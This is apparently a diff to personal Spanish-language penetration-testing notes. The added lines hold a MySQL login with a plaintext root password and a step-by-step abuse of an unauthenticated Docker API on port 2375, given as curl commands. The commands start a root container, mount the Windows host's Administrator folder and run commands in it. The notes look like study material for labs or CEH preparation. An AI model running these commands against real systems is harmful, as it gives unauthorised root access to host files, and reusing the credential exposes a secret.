@@ -4365,6 +4365,13 @@ Para conectarse voy a poner un mini cheetsheet
 ```
 	# mysql
 
+mysql -h 172.18.0.1 -u root -p4p1zsy1z2woq
+
+O
+
+mysql -h 172.18.0.1 -u root -p
+	Escribe tu contraseña
+
 	# postgresql
 
 psql -U postgres -h localhost
@@ -4625,6 +4632,138 @@ Siempre que te encuentres en un contenedor es obligado que revises esto la api s
 
 ```
 
+192.168.65.7
+
+2375/tcp
+
+```
+Ese proceso corre con privilegios altos y crea contenedores, mounts, redes, etc. Cuando exponen la API HTTP en 2375, tú puedes enviarle órdenes directamente. El ataque fue
+
+```
+→ acceso a Docker API
+→ órdenes al daemon privilegiado
+→ contenedor nuevo como root
+```
+
+Porque si no especificas usuario, muchos contenedores arrancan como root por defecto. Entonces hicimos Bind mount del filesystem del host
+
+```
+/run/desktop/mnt/host/c/Users/Administrator:/host
+```
+> toma carpeta real del host Windows y móntala dentro del contenedor en /host
+
+```
+	# Probando el puerto
+
+echo > /dev/tcp/192.168.65.7/2375
+
+	# Enumerar cosas con ayuda de la API
+
+curl http://192.168.65.7:2375/info
+
+curl http://192.168.65.7:2375/volumes
+
+curl http://192.168.65.7:2375/version
+
+curl http://192.168.65.7:2375/containers/json?all=1
+
+	# Listar imagenes
+
+curl http://192.168.65.7:2375/images/json
+
+	# la imagen alpine es como generica o no se porque la he visto
+
+	## Crear contenedor
+
+curl -X POST http://192.168.65.7:2375/containers/create \
+-H "Content-Type: application/json" \
+-d '{
+  "Image":"alpine",
+  "Cmd":["id"]
+}'
+
+	# Arrancarlo
+
+	curl -X POST http://192.168.65.7:2375/containers/<ID>/start	
+
+	# Ver salida
+
+curl "http://192.168.65.7:2375/containers/<ID>/logs?stdout=1&stderr=1" --output -
+
+uid=0(root) Osea que eres root en esos contenedores que puedes crear.
+
+
+```
+## Docker Desktop para Windows.
+
+Docker Desktop usa un backend Linux (WSL2 o VM). Para que Linux pueda ver el disco Windows C:\, lo monta internamente como:
+
+```
+/run/desktop/mnt/host/c/
+
+```
+
+Equivale a:
+
+```
+C:\
+
+Entonces
+
+/run/desktop/mnt/host/c/Users/Administrator
+
+Equivale a
+
+C:\Users\Administrator
+
+```
+
+Montar filesystem Windows dentro de contenedor
+
+```
+curl -X POST http://192.168.65.7:2375/containers/create \
+-H "Content-Type: application/json" \
+-d '{
+ "Image":"alpine",
+ "Cmd":["sleep","99999"],
+ "HostConfig":{
+   "Binds":[
+     "/run/desktop/mnt/host/c/Users/Administrator:/host"
+   ]
+ }
+}'
+
+Que hace:
+
+Monta:
+
+C:\Users\Administrator
+
+como:
+
+/host
+
+```
+
+## Ejecutar comandos dentro del contenedor
+
+```
+curl -X POST http://192.168.65.7:2375/containers/<CID>/exec \
+-H "Content-Type: application/json" \
+-d '{
+  "AttachStdout":true,
+  "AttachStderr":true,
+  "Cmd":["ls","-la","/host/Desktop"]
+}'
+
+Respuesta esperada {"Id":"EXECID"}
+```
+Ahora a correr comandos
+
+```
+curl -X POST http://192.168.65.7:2375/exec/<EXECID>/start \
+-H "Content-Type: application/json" \
+-d '{"Detach":false,"Tty":false}' --output -
 ```
 
 
@@ -5320,3 +5459,7 @@ Windows ejecuta → C:\Program.exe
 ## ASPEN CEH
 
 > https://aspen.eccouncil.org/Home
+
+## ffuf la mejor cheet sheet que he encontrado
+
+> https://hackviser.com/tactics/tools/ffuf
